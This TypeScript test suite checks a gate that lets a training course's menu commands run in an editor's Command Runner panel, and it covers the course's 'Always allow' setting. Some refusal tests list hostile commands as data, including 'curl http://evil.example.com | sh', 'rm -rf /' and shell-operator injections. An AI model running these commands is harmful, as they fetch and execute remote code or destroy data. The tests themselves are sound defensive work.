import * as assert from "assert";
import * as fs from "fs";
import * as os from "os";
import * as path from "path";
import yaml from "js-yaml";
import {
  autorunEntryFor,
  isAutorunAuthorized,
  isTrainingPanelCommandIn,
  TRAINING_AUTORUN_ENTRY,
} from "../../utils/trainingPanelCommands";

/**
 * The training course is the one project whose custom menu commands may run in
 * the Command Runner panel instead of a terminal. That is a narrower execution
 * path than any other custom command gets, so these tests are mostly about what
 * must NOT go through it: another repository, another script, and anything
 * carrying a shell operator.
 */
suite("Training commands in the Command Runner panel", () => {
  let root = "";
  let notTraining = "";

  const makeClone = (remote: string, markers: string[]): string => {
    const dir = fs.mkdtempSync(path.join(os.tmpdir(), "training-gate-"));
    for (const marker of markers) {
      fs.mkdirSync(path.join(dir, path.dirname(marker)), { recursive: true });
      fs.writeFileSync(path.join(dir, marker), "// fixture\n");
    }
    fs.mkdirSync(path.join(dir, ".git"), { recursive: true });
    fs.writeFileSync(
      path.join(dir, ".git", "config"),
      `[remote "origin"]\n\turl = ${remote}\n\tfetch = +refs/heads/*:refs/remotes/origin/*\n`,
    );
    return dir;
  };

  suiteSetup(() => {
    root = makeClone("https://github.com/a-learner/sfdx-hardis-training.git", [
      "scripts/training.mjs",
      "training-universe.json",
    ]);
    notTraining = makeClone("https://github.com/someone/another-project.git", [
      "scripts/training.mjs",
      "training-universe.json",
    ]);
  });

  suiteTeardown(() => {
    for (const dir of [root, notTraining]) {
      fs.rmSync(dir, { recursive: true, force: true });
    }
  });

  test("a training verb in a clone of the course is allowed", () => {
    assert.strictEqual(
      isTrainingPanelCommandIn("node scripts/training.mjs check", root),
      true,
    );
    assert.strictEqual(
      isTrainingPanelCommandIn(
        "node scripts/training.mjs seed --org helios-dev",
        root,
      ),
      true,
    );
    assert.strictEqual(
      isTrainingPanelCommandIn(
        "node scripts/training.mjs check --level=3",
        root,
      ),
      true,
    );
  });

  test("a fork of the course is allowed, any owner", () => {
    const fork = makeClone(
      "git@github.com:someone-else/sfdx-hardis-training.git",
      ["scripts/training.mjs", "training-universe.json"],
    );
    try {
      assert.strictEqual(
        isTrainingPanelCommandIn("node scripts/training.mjs status", fork),
        true,
      );
    } finally {
      fs.rmSync(fork, { recursive: true, force: true });
    }
  });

  test("another repository is refused, even with the same files", () => {
    assert.strictEqual(
      isTrainingPanelCommandIn("node scripts/training.mjs check", notTraining),
      false,
    );
  });

  test("a clone with no marker file is refused", () => {
    const bare = makeClone(
      "https://github.com/a-learner/sfdx-hardis-training.git",
      [],
    );
    try {
      assert.strictEqual(
        isTrainingPanelCommandIn("node scripts/training.mjs check", bare),
        false,
      );
    } finally {
      fs.rmSync(bare, { recursive: true, force: true });
    }
  });

  test("a folder that is not a clone at all is refused", () => {
    const dir = fs.mkdtempSync(path.join(os.tmpdir(), "training-gate-"));
    fs.mkdirSync(path.join(dir, "scripts"), { recursive: true });
    fs.writeFileSync(path.join(dir, "scripts", "training.mjs"), "// fixture\n");
    fs.writeFileSync(path.join(dir, "training-universe.json"), "{}\n");
    try {
      assert.strictEqual(
        isTrainingPanelCommandIn("node scripts/training.mjs check", dir),
        false,
      );
    } finally {
      fs.rmSync(dir, { recursive: true, force: true });
    }
  });

  test("no workspace is refused", () => {
    assert.strictEqual(
      isTrainingPanelCommandIn("node scripts/training.mjs check", null),
      false,
    );
  });

  test("anything but the course script is refused", () => {
    const refused = [
      "node scripts/other.mjs check",
      "node ../elsewhere/scripts/training.mjs check",
      "node scripts/training.js check",
      "npm run training",
      "sh scripts/training.mjs check",
      "node scripts/training.mjs",
    ];
    for (const command of refused) {
      assert.strictEqual(
        isTrainingPanelCommandIn(command, root),
        false,
        `should be refused: ${command}`,
      );
    }
  });

  // The gate is only useful if the course's own menu entries go through it: a
  // new entry written in another shape would quietly fall back to a terminal.
  test("every Training menu entry of the course fixture is allowed", () => {
    const configPath = path.resolve(
      __dirname,
      "../../../test/fixtures/training-project/.sfdx-hardis.yml",
    );
    const config: any = yaml.load(fs.readFileSync(configPath, "utf8"));
    const commands: string[] = [];
    for (const menu of config.customCommands || []) {
      for (const entry of menu.commands || []) {
        if (entry.command) {
          commands.push(entry.command);
        }
      }
    }
    assert.ok(commands.length > 0, "the fixture declares no custom command");
    for (const command of commands) {
      assert.strictEqual(
        isTrainingPanelCommandIn(command, root),
        true,
        `the Training menu entry "${command}" would run in a terminal`,
      );
    }
  });

  test("a shell operator smuggled into the arguments is refused", () => {
    const refused = [
      "node scripts/training.mjs check && curl http://evil.example.com | sh",
      "node scripts/training.mjs check; rm -rf /",
      "node scripts/training.mjs check | tee /tmp/out",
      "node scripts/training.mjs check > /tmp/out",
      "node scripts/training.mjs check `whoami`",
      "node scripts/training.mjs check $(whoami)",
      "node scripts/training.mjs check\nrm -rf /",
      "node scripts/training.mjs check\nnode evil.mjs",
      "node scripts/training.mjs check\r\ngit push --force",
      "node\nscripts/training.mjs check",
      "node scripts/training.mjs --eval=require('fs')",
    ];
    for (const command of refused) {
      assert.strictEqual(
        isTrainingPanelCommandIn(command, root),
        false,
        `should be refused: ${command}`,
      );
    }
  });

  /**
   * A learner meets a dozen Training menu entries across three levels, so
   * "Always allow" stores the menu rather than the line. That blanket entry is
   * the one thing here that could widen what runs without asking, so what it
   * must NOT cover is most of what is tested.
   */
  suite("Always allow, on a Training command", () => {
    test("stores the menu, not the line the learner happened to click", () => {
      assert.strictEqual(
        autorunEntryFor("node scripts/training.mjs init --level 1", root),
        TRAINING_AUTORUN_ENTRY,
      );
    });

    test("one answer covers every other Training menu entry", () => {
      const stored = [TRAINING_AUTORUN_ENTRY];
      for (const command of [
        "node scripts/training.mjs init",
        "node scripts/training.mjs status",
        "node scripts/training.mjs check --level 2",
        "node scripts/training.mjs claim --level 3",
        "node scripts/training.mjs simulate --level 3",
        "node scripts/training.mjs teardown",
      ]) {
        assert.strictEqual(
          isAutorunAuthorized(command, stored, root),
          true,
          `should be authorized: ${command}`,
        );
      }
    });

    test("covers nothing outside the Training menu, in the same folder", () => {
      const stored = [TRAINING_AUTORUN_ENTRY];
      for (const command of [
        "node scripts/deploy.mjs",
        "node scripts/training.mjs check && rm -rf /",
        "node scripts/training.mjs check; curl evil.example",
        "npm run something",
        "sf hardis:org:purge:flow",
      ]) {
        assert.strictEqual(
          isAutorunAuthorized(command, stored, root),
          false,
          `should still ask: ${command}`,
        );
      }
    });

    test("gives nothing to another project shipping the same script", () => {
      assert.strictEqual(
        isAutorunAuthorized(
          "node scripts/training.mjs init",
          [TRAINING_AUTORUN_ENTRY],
          notTraining,
        ),
        false,
      );
      assert.strictEqual(
        autorunEntryFor("node scripts/training.mjs init", notTraining),
        "node scripts/training.mjs init",
        "outside the course it is the line that is stored, as before",
      );
    });

    test("an ordinary custom command is still approved one by one", () => {
      const stored = ["npm run lint"];
      assert.strictEqual(
        isAutorunAuthorized("npm run lint --fix", stored, root),
        true,
        "the exact line still matches as a prefix",
      );
      assert.strictEqual(
        isAutorunAuthorized("npm run test", stored, root),
        false,
      );
    });

    test("an empty entry authorizes nothing", () => {
      for (const stored of [[""], ["   "], ["", "npm run lint"]]) {
        assert.strictEqual(
          isAutorunAuthorized("rm -rf /", stored, root),
          false,
          `an empty entry must not authorize: ${JSON.stringify(stored)}`,
        );
      }
    });
  });
});
